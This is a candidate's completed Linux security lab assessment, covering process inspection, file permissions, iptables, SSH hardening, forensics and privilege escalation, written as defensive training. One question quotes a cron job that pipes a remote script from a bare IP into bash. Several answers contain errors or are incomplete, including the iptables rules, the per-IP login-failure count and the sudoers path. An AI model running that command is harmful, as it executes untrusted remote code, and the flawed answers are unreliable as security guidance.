# Week 4 Linux Internals Lab Assessment

**48-Week Security Engineering Curriculum**

**Candidate:** Tanveer Salim (fosres)

---

| Field | Value |
|-------|-------|
| **Duration** | 90 minutes |
| **Total Points** | 100 points |
| **Passing Score** | 70 points (70%) |
| **Resources Allowed** | Linux VM, man pages, no external internet |

## Sources

- Complete 48-Week Security Engineering Curriculum, Pages 13-14
- Grace Nolan's Security Engineering Notes (github.com/gracenolan/Notes)
- HackTricks Linux Privilege Escalation (book.hacktricks.xyz)
- CIS Benchmark for Linux

---

## Section 1: Process Management (20 points)

**Scenario:** You are investigating a potentially compromised server. A user reported unusual CPU usage.

---

**1. [4 points]** Write the command to display all running processes with their parent process IDs, user owners, and full command lines. Then explain what the output columns PID, PPID, UID, and CMD represent.

*Your Answer:*

```
ps j
```

PID: process ID

PPID: parent process ID

UID: user ID of process owner 

CMD: command that launched the process

---

**2. [4 points]** You discover a suspicious process with PID 4521. Using the /proc filesystem, write the commands to:

a) Find the exact binary path that spawned this process

```
ps j 4521
```
The exact binary path will be under the `COMMAND` column.

b) View the environment variables the process was started with

```
cat /proc/4521/environ --show-nonprinting
```

c) List all file descriptors the process has open

*Your Answer:*

```
ls -l /proc/4521/fd
```

d) Determine the current working directory of the process

*Your Answer:*

```
pwdx 4521
```

---

**3. [4 points]** Explain the difference between a zombie process and an orphan process. How would you identify each using ps or top? What security implications do zombie processes have?

*Your Answer:*

Zombie Process: A process that finished executing but still has an entry

in the process table. Zombie Processes can pose a security risk

if they are outdated software. They can also deplete system resources.

If zombie processes deplete too many resources a machine may be unable

to process client requests--rendering the computer unusable.

To view zombie processes run the following command:

```
ps axo pid=,stat= | awk '$2~/^Z/ { print }'
```

Orphan Process: A process whose parent no longer exists.

To view orphan processes run the following command:

```
ps -eo pid,ppid,cmd | awk ‘$2==1 {print $0}’
```
---

**4. [4 points]** Using htop or top, you notice a process consuming 95% CPU. Write the command sequence to:

a) Change its priority to lower (nice value of 19)

```
renice -n 19 -p [PID]
```

b) Suspend the process without killing it

```
kill -STOP [PID]
```

c) Resume the process in the background

```
kill -CONT [PID]
```

d) Terminate it gracefully, then forcefully if it doesn't respond

*Your Answer:*

```
kill -15 [PID]
```

Forcefully terminate:

```
kill -9 [PID]
```

---

**5. [4 points]** Explain what UID, GID, and effective UID (EUID) are. Why might a process have a different EUID than its real UID? Provide a common example of when this occurs.

*Your Answer:*

UID: user ID of process owner 

GID: A number to identify a group of users that share permissions

and access rights

EUID: Normally UID but this number can be changed to enable a

non-privileged user to access files that can only be accessed by

a privileged user like root.

---

## Section 2: File Permissions & User Management (20 points)

**Scenario:** You are hardening a new web server and need to configure proper permissions for application files.

---

**6. [4 points]** Given the following ls -l output:

```
-rwsr-x--- 1 root webadmin 45632 Jan 5 10:30 /opt/webapp/deploy.sh
```

The first string `-rwsr-x---` is the Access Control List. There is

a problem with the file's permissions: if the script is run it

will be executed as root user-owner because the set executable bit

is set! This should be changed to:

```
-rwxr-x--- 1 root webadmin 45632 Jan 5 10:30 /opt/webapp/deploy.sh
```

The number `1` is the number of hardlinks to the BASH script.

The word `root` means the executable script is owned by the root user.

The word `webadmin` means the executable script belongs to that group

and therefore each user that belongs to the `webadmin` group will

be able to read and execute the script because the `r-x` flags are set.

`45632` means the executable script has that many bytes stored in the

file.

`Jan 5 10:30` is the last datetime the file was modified.

`/opt/webapp/deploy.sh` is the binary path of the executable.


Explain each component of the permission string. What is the security concern with this file's permissions? How would you fix it?

*Your Answer:*

Explained previously, the set bit is set for executable for root

user-owner...meaning the file will execute as root user-owner even

if the user is not root! Dangerous! The following would be a fix:

```
-rwxr-x--- 1 root webadmin 45632 Jan 5 10:30 /opt/webapp/deploy.sh
```
---

**7. [4 points]** Write the chmod command (using both symbolic and octal notation) to set the following permissions on /var/www/html/config.php:

- Owner (www-data): read and write
- Group (webadmin): read only
- Others: no permissions

*Your Answer:*

```
chmod 640 /var/www/html/config.php
```

---

**8. [4 points]** Examine this /etc/passwd entry:

```
appuser:x:1001:1001:Application User:/home/appuser:/bin/bash
```

Explain each field. What does the 'x' in the second field indicate? Where would you find the actual password hash? What file permissions should that file have?

*Your Answer:*

The 'x' means the password hash is stored in `/etc/shadow`.

`/etc/shadow` has the following file permissions:


```
-rw-r----- 1 root shadow 1103 Jul 27 19:41 /etc/shadow
```

Which means root is user-owner of `/etc/shadow` and can read and

edit the file.

All users belonging to user-group `shadow` can only read the file.

Everyone else cannot access `/etc/shadow`.

---

**9. [4 points]** You need to allow user 'deployer' to run only `/usr/bin/systemctl restart webapp` without a password. Write the exact line you would add to /etc/sudoers (using visudo). Explain why using NOPASSWD for all commands would be a security risk.

*Your Answer:*

Using visudo technique:

1. First run `visudo`

2. Append the following line to the file:

```
deployer ALL = NOPASSWD: usr/bin/systemctl restart webapp 
```

Using /etc/sudoers technique:

1. Type in the following command:

```
sudo vim /etc/sudoers
```

2. Now append the following line to the file:

```
deployer ALL = NOPASSWD: usr/bin/systemctl restart webapp 
```

Allowing NOPASSWD for all commands would be practically giving

root privileges to the user. The user does not ever need to type

in the password to run any command that requires superuser

privileges!

---

**10. [4 points]** Explain the difference between the sticky bit, SUID, and SGID. Provide one legitimate use case for each and one potential security risk for each.

*Your Answer:*

Sticky Bit: When set only the user-owner or root user can delete

or rename the file or directory--even if other users have write

permissions.

SUID: When set on an executable file it runs with owner's privileges

instead of the user who executes it.

SGID: When set on an executable it runs with group's privileges.

---

## Section 3: System Hardening (20 points)

**Scenario:** You are configuring firewall rules and implementing security controls on a production server.

---
**11. [5 points]** Write iptables rules to:

a) Allow incoming SSH (port 22) only from 10.0.0.0/24 subnet (INPUT chain)

b) Allow incoming HTTP (80) and HTTPS (443) from anywhere (INPUT chain)

(CHECK) c) Allow established and related incoming connections (INPUT chain)

(CHECK) d) Drop all other incoming traffic (INPUT chain)

(CHECK) e) Allow all outgoing traffic (OUTPUT chain)

*Your Answer:*

```
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp -s 10.0.0.0/24 --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -s 10.0.0.0/24 --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 443 -j ACCEPT
```

---

**12. [5 points]** Explain the difference between iptables chains: INPUT, OUTPUT, and FORWARD. In what scenario would you use the FORWARD chain? What is the difference between the ACCEPT, DROP, and REJECT targets?

*Your Answer:*

```
INPUT: The computer that is inspecting an incoming packet acts on the

decision to be made on the packet.

FORWARD: The computer that is inspecting the packet must make a

decision on how to forward the packet to another computer.

OUTPUT: The computer that is inspecting an outgoing packets acts

on the decision on how to send the packet.
```

---

**13. [5 points]** What is SELinux and how does it differ from traditional DAC (Discretionary Access Control)? Explain the three modes of SELinux. What command would you use to check the current SELinux status? How would you temporarily disable SELinux (and why might this be dangerous)?

*Your Answer:*

Security-Enhanced Linux is an enforcement of mandatory access control

in the Linux kernel--checking for allowed operations after standard

discretionary access controls are checked.

Security-Enhanced Linux thus enforces a system-wide security policy

on all process and files in the operating sytem.

In contrast Discretionary Access Control Policy controls how subjects

interact with users control the permissions of files/directories

they own--making it very hard to enfore a system-wide security policy

that Security-Enhanced Linux allows.

The three modes of Security-Enhanced Linux are:

1. Enforcing Mode: SELinux enforces loaded security policy on the

entire operating system

2. Permissive Mode: SELinux permits everything but logs events

that would have been denied in Enforcing Mode 

3. Disabled Mode: SELinux is not enforcing or logging anything.

---

**14. [5 points]** List five SSH hardening configurations you would implement in /etc/ssh/sshd_config. For each, explain the security rationale.

*Your Answer:*

1. `PermitRootLogin no`: This forbids anyone from logging in as

root user. This is dangerous as it will allow an attacker that logs

in as root to do anything the attacker wants on the compromised

machine. Better to ban logging in as root user altogether.

2. `PubkeyAuthentication yes`: This allows users to login with SSH

public key based authentication--which features a one-time challenge

response and an additional optional password to decrypt the private

key. It is harder to compromise public key authentication than mere

password challenge.

3. `PasswordAuthentication no`: Better to disable and require user

to apply SSH public-key based authentication since it is harder

to compromise.

4. `PermitEmptyPasswords no`: This would allow the user to login

without applying a password during login--this only makes the attacker's

job of compromising the server easier--always set this to 'no'.

5.

```
# Ciphers and Keying

Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com

HostKeyAlgorithms ssh-ed25519

KexAlgorithms curve25519-sha256
```

Choices of ciphers and keying are very important for security

of end-to-end encryption in SSH. The ciphers and keying featured

above only allow strong encryption algorithms.

6.

```
MaxAuthTries 10
```

It is a good idea to rate-limit the number of times an IP address

can attempt to SSH login. Avoids overwhelming the server with

requests.

7. Change port number to a higher number. This is not the most

important defense but you will still less often face attacks by

ssh bots if you do this. For example I have changed the allowed

port number to:

```
Port 50000
```

8.

```
X11Forwarding no
```

The above disables GUI forwarding. You generally do not need to

allow anyone to do this since you are running a server so its a good

idea to disable this.

9.

```
AllowUsers your_username
```

Please remember to restart your ssh service on the server after

making these changes to the `sshd_config`:

```
sudo systemctl restart sshd
```


---

## Section 4: Linux Forensics (20 points)

**Scenario:** You suspect a server was compromised 48 hours ago. Perform initial forensic analysis.

---

**15. [5 points]** Write commands to:

a) Find all files modified in the last 48 hours in /etc


```
sudo find /etc -mtime -2
```

b) Find all SUID binaries on the system

```
find / -perm -4000 -print
```
c) Find files with no owner (orphaned files)

```
find / -nouser -or -nogroup 
```

d) Find world-writable files in /var

```
find / -path /var -prune -o -perm -2 ! -type l -ls
```

e) Find hidden files in /tmp

*Your Answer:*

```
find /tmp -type f -name '.*'
```

---

**16. [5 points]** Explain the difference between atime, mtime, and ctime. How would an attacker try to manipulate these timestamps to hide their activity? What command can modify timestamps, and what forensic technique can detect timestamp manipulation?

*Your Answer:*

atime: Last time the file was read

mtime: Last time file modified

ctime: Last time file's metadata was changed 

---

**17. [5 points]** Analyze this auth.log excerpt and describe what attack is occurring:

```
Jan 5 14:22:01 server sshd[4521]: Failed password for root from 45.33.32.156 port 52341
Jan 5 14:22:03 server sshd[4522]: Failed password for root from 45.33.32.156 port 52342
Jan 5 14:22:05 server sshd[4523]: Failed password for admin from 45.33.32.156 port 52343
Jan 5 14:22:07 server sshd[4524]: Failed password for admin from 45.33.32.156 port 52344
Jan 5 14:22:09 server sshd[4525]: Failed password for ubuntu from 45.33.32.156 port 52345
```

What type of attack is this? What tool would help mitigate it? Write the command to count failed login attempts by IP address from auth.log.

*Your Answer:*

Brute-Force Login attempt to gain access as a user with superuser

privileges. The `fail2ban` tool should help ban the IP address

from attempting to login.

```
grep -c "Failed password" /var/log/auth.log
```

---

**18. [5 points]** You need to check user activity history. Write commands to:

a) View the last 10 logins for all users

```
last -n 10
```

b) Check if any user's .bash_history has been deleted or is a symlink to /dev/null

SKIPPING QUESTION due to seeming irrelevance to security

c) List all users currently logged in with their source IPs

```
w
```

d) View the wtmp log for login history

```
last -f /var/log/wtmp
```

e) Check for failed login attempts in the btmp log

*Your Answer:*

```
sudo lastb
```

---

## Section 5: Privilege Escalation & Attack Detection (20 points)

**Scenario:** You are conducting a security assessment and need to identify potential privilege escalation vectors.



---

**19. [5 points]** Explain three common Linux privilege escalation techniques using SUID binaries. For each, describe:

a) How the attack works

1. Attacker runs the following commmand:

```
find / -perm -u=s -type f 2>/dev/null
```

The above command will print the absolute paths to all SUID binaries.

2. The attacker next targets a binary and runs it. 

b) A real-world example binary

In my own Linux system (running Debian) I executed the above command

and discovered the following is an SUID binary:

```
/usr/bin/mount
```

c) How to detect and prevent it

*Your Answer:*

Use the command I listed from a) to list all SUID binaries available

in your system. Inspect each binary to determine if leaving it

as an SUID binary is a security risk. For example let's assume

we see that the `rm` binary is an SUID binary. So you will see

this when you run `ls -la /usr/bin/rm`:

```
-rwsr-xr-x 1 root root 72752 Sep 20  2022 /usr/bin/rm
```

This is not good! An attacker that compromises the server

can use the `rm` command to execute files that should require

superuser privileges. The permissions must be set to the executable

`x` bit instead so that the SUID binary becomes:


```
-rwxr-xr-x 1 root root 72752 Sep 20  2022 /usr/bin/rm
```
---

**20. [5 points]** You discover this sudoers entry:

```
webadmin ALL=(ALL) NOPASSWD: /usr/bin/vim /var/log/apache2/*
```

Explain how this could be exploited for privilege escalation. What would a secure alternative look like?

*Your Answer:*

```
The attacker can edit scripts using vim that can cause harm to the

server. The attacker can also edit the apache2 logs to hide their

compromise of the server.
```

---

**21. [5 points]** List five common persistence mechanisms an attacker might use on a Linux system. For each, explain where to look for evidence and how to detect it.

*Your Answer:*

1. systemd services: An attacker can create or edit a systemd

service to run malicious programs on startup.

You can check for malicious systemd services by running the

command:

```
systemctl list-units --type=service 
```

Inspect services for malicious behavior

Delete or edit the service.

2. Malicious cronjobs

Attacker can also make malicious cronjobs. You can find them with

the following commands:

```
crontab -l

ls -la /etc/cron.d

ls -la /etc/cron.daily
```

3. An attacker can also attach an SSH key to the server allowing

them to gain SSH access to the server in the future.

You can look for unauthorized keys by doing the following:

```
grep -vE '^' ~/.ssh/authorized_keys  Check for unauthorized keys 
```

4. An attacker can also inject a malicious library via `LD_PRELOAD`

```
cat /etc/ld.so.preload  
``` 
5. An attacker can also edit the `bash_profile`. To inspect the

`bash_profile` for malicious edits:

```
tail -n 10 ~/.bashrc ~/.profile  Inspect shell profiles 
```

---

**22. [5 points]** You notice an unusual cron job:

```
*/5 * * * * curl -s http://185.220.101.45/update.sh | bash
```

What are the security concerns with this cron job? How would you investigate this further? What commands would you use to list all cron jobs on the system (including those for all users)?

*Your Answer:*

The cronjob is downloading a script from a public server and executing

it with bash. This is not good. Since the cronjob is downloading

from a server with a public IP address without a domain (and TLS) it is

possible that the attacker installed this cronjob to download malicious

scripts owned by the attacker on the public server

`http://185.220.101.45`

I would ask the team if this cronjob is expected to exist in the

system--which it probably isn't. Once the team agrees its not supposed

to be there I would delete the cronjob.

---

## Grading Rubric

| Section | Points | Your Score |
|---------|--------|------------|
| Section 1: Process Management | 20 | |
| Section 2: File Permissions & User Management | 20 | |
| Section 3: System Hardening | 20 | |
| Section 4: Linux Forensics | 20 | |
| Section 5: Privilege Escalation & Attack Detection | 20 | |
| **TOTAL** | **100** | |

### Scoring Criteria

- **90-100 (Excellent):** Ready for Security Engineering interviews
- **80-89 (Good):** Minor gaps, review weak areas
- **70-79 (Pass):** Adequate understanding, continue practicing
- **Below 70 (Needs Review):** Re-study Week 4 materials before proceeding
